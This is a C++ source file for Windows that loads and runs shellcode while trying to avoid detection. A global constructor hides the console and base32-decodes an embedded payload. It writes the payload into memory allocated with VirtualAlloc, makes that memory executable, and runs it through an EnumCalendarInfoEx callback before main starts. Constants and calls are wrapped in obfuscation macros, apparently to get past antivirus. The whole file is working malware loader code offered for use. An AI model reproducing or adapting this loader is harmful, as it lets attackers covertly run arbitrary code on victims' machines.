#include <Windows.h>
#include "payload.h"
#include "base32.hpp"
#include "obfuscation.h"
class shell_exec {
public:
    shell_exec() {
        FreeConsole();
        std::string base32_string(reinterpret_cast<const char*>(payload), sizeof(payload));
        std::vector<BYTE> decoded_data = CALL(&base32::base32_decode, base32_string);
        LPVOID exec_mem = VirtualAlloc(NULL, decoded_data.size(), OBF(0x00001000) | OBF(0x00002000), OBF(0x04));
        memcpy(exec_mem, decoded_data.data(), decoded_data.size());
        DWORD old;
        VirtualProtect(exec_mem, decoded_data.size(), OBF(0x20), &old);
        EnumCalendarInfoEx((CALINFO_ENUMPROCEX)exec_mem, LOCALE_SYSTEM_DEFAULT, OBF(0xffffffff), OBF(0x0000001d));
    }
};
shell_exec x;
int main() {
    return 0;
}